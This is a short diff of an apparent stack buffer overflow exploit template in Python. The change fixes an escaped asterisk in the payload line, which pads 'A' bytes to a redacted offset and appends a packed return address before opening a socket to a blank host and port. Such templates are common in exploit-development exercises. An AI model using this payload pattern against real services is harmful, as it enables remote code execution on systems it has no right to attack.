@@ -4,7 +4,7 @@ import struct
 
 offset = _REDACTED_
 address = _REDACTED_
-payload = b"A" \* offset + struct.pack("<I", address)
+payload = b"A" * offset + struct.pack("<I", address)
 host = ""
 port =
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
